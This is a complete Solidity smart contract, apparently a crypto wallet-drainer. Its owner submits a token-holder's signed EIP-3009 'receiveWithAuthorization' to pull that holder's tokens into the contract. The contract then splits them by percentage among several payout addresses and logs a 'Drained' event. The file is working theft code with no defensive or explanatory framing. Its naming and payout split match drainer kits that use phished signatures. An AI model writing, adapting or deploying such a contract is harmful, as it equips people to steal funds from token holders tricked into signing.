// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureDrain {
    address public owner;

    struct Authorization {
        address from;
        uint256 value;
        uint256 validAfter;
        uint256 validBefore;
        bytes32 nonce;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    event Drained(address indexed token, address indexed from, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function drain(
        address token,
        Authorization calldata auth,
        address[] calldata recipients,
        uint256[] calldata percents
    ) external onlyOwner {
        require(recipients.length > 0, "No recipients");
        require(recipients.length == percents.length, "Length mismatch");

        (bool ok,) = token.call(
            abi.encodeWithSignature(
                "receiveWithAuthorization(address,address,uint256,uint256,uint256,bytes32,uint8,bytes32,bytes32)",
                auth.from, address(this), auth.value,
                auth.validAfter, auth.validBefore, auth.nonce,
                auth.v, auth.r, auth.s
            )
        );
        require(ok, "receiveWithAuthorization failed");

        uint256 total = auth.value;
        uint256 distributed = 0;
        for (uint256 i = 0; i < recipients.length - 1; i++) {
            require(recipients[i] != address(0), "Zero recipient");
            uint256 share = total * percents[i] / 100;
            distributed += share;
            (bool success, bytes memory data) = token.call(
                abi.encodeWithSignature("transfer(address,uint256)", recipients[i], share)
            );
            require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
        }

        address last = recipients[recipients.length - 1];
        require(last != address(0), "Zero recipient");
        (bool lastOk, bytes memory lastData) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", last, total - distributed)
        );
        require(lastOk && (lastData.length == 0 || abi.decode(lastData, (bool))), "Transfer failed");

        emit Drained(token, auth.from, auth.value);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}